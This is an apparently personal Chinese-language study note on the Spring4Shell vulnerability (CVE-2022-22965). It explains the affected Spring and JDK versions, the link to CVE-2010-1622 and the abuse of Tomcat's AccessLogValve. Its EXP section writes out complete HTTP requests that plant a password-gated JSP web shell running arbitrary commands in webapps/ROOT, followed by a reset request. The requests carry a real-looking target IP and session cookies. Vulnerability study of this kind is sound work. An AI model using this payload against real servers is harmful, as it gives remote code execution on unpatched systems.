# Spring4Shell

## 简介

Spring MVC框架的参数绑定功能提供了将请求中的参数绑定控制器方法中参数对象的成员变量，攻击者通过构造恶意请求获取AccessLogValve对象并注入恶意字段值触发pipeline机制可写入任意路径下的文件。

影响JDK9+，且Spring的版本：

> Spring Framework 5.3.X < 5.3.18
>
> Spring Framework 5.2.X < 5.2.20

似乎有人说只能SpringMVC有效？这个没具体试了。

CVE号是CVE-2022-22965。

## CVE-2010-1622

之所以还会提这个很老的CVE就是因为Spring4Shell是在这个CVE的基础上加以利用的：

http://rui0.cn/archives/1158



## JDK9及以上

之所以需要JDK9及以上就是因为遍历一下`Introspector.getBeanInfo（Class.class）`会发现JDK9比JDK8多了`module`和`packetName`，这个漏洞就是利用的model来获取了`AccessLogValve`对象。

## AccessLogValve

参考http://xiaobaoqiu.github.io/blog/2014/12/30/tomcat-access-logpei-zhi/

这样就可以通过Access Log来写shell了。

## EXP

```html
GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= HTTP/1.1
Host: 121.5.169.223:8080
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
suffix: %>//
c1: Runtime
c2: <%
DNT:1
Cookie: __typecho_lang=zh_CN; PHPSESSID=6d3c586844b6156145dc3052dc73a614; session=cb52d5fd-02d3-470e-8e2d-8ab9da3050d0.8sK-qaB9Y4PsNG_IoB8nA5g7rvA; JSESSIONID=68F3E7935CF94FF0612E2AA3C27C6DE2
Connection: close


```

之后再请求一下pattern为空的就好了：

```java
GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern= HTTP/1.1
Host: 121.5.169.223:8080
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
suffix: %>//
c1: Runtime
c2: <%
DNT:1
Cookie: __typecho_lang=zh_CN; PHPSESSID=6d3c586844b6156145dc3052dc73a614; session=cb52d5fd-02d3-470e-8e2d-8ab9da3050d0.8sK-qaB9Y4PsNG_IoB8nA5g7rvA; JSESSIONID=68F3E7935CF94FF0612E2AA3C27C6DE2
Connection: close


```

再访问`shell.jsp`即可rce。



但是我本地不知道因为什么奇怪的原因打不通呜呜呜。

## 参考链接

https://github.com/vulhub/vulhub/tree/master/spring/CVE-2022-22965